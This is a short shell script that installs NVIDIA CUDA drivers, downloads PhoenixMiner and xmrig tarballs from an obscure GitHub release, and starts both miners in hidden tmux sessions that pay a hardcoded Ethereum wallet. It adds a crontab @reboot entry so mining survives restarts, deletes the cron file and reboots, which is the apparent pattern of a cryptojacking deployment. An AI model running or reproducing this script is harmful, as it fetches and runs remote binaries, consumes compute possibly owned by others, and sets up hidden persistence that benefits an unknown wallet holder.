#!/bin/sh
sudo sysctl -p
sudo apt-get update
cd $HOME/
sudo apt-get -y -qq upgrade
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev unzip tmux
sudo apt-get install linux-headers-$(uname -r)
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-get update
sudo apt-get -y install cuda-drivers
export PATH=/usr/local/cuda-11.2/bin${PATH:+:${PATH}}
wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
tar -zxvf winxmr.tar.gz
wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
tar xzf PhoenixMiner_5.6d_Linux.tar.gz
echo '#!/bin/sh'>>start.sh
echo "cd $HOME/">>start.sh
echo "tmux kill-server">>start.sh
echo "sleep 1">>start.sh
echo "sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x50167235D2b995DEdc2f2d28Cd1cD184D97f1aba.Image -pass x'">>start.sh
echo "sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'">>start.sh
echo "@reboot  sh $HOME/start.sh">> resmi
crontab resmi
sudo rm resmi
sudo reboot
